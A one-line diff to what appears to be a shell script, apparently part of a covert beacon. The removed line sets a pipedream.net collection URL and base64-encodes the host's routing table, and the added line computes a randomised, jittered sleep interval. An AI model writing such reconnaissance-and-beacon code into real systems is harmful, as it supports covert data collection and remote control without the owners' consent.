@@ -1,1 +1,1 @@
-domvar="https://75e5d2f85b9d81b267bfcd27c813de32.m.pipedream.net"; route -n | base64 -w0; sleep=230
+s=700;j=$[$RANDOM%50+10];p=$((($s*$j)/100));if [ $(($RANDOM%2)) == 0 ];then r=$(($s-$p));else r=$(($s+$p));fi;sleep $r
